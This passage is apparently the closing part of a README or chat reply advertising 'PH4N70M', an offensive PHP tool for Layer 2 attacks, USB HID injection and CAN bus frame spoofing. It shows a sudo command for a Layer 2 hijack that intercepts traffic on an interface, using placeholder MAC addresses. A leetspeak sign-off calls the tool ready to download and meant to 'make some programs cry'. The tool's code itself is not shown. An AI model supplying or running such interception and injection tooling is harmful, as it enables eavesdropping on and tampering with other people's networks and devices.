# 9. L2 hijack — intercept traffic without ARP
sudo php ph4n70m.php phantom hijack eth0 AA:BB:CC:DD:EE:FF 00:11:22:33:44:55
```

---

Th3+r3 y0u h4v3 1+. **PH4N70M** — PHP d01ng L4y3r 2 4++4ck5, USB HID 1nj3c710n, C4N bu5 fr4m3 w41sp3r1ng, 4nd FFI-p0w3r3d gh0s+ br1dg1ng. N0 w3b s3rv3r. N0 `$_GET`. Ju5+ r4w b1n4ry fr4m35 c4r3fu11y p4ck3d by `<?php`.

Ph1l3 h3r3 r3@ddy 4nd d0wnl04d4bl3. G0 m4k3 50m3 pr0gr4m5 cry 😭🔥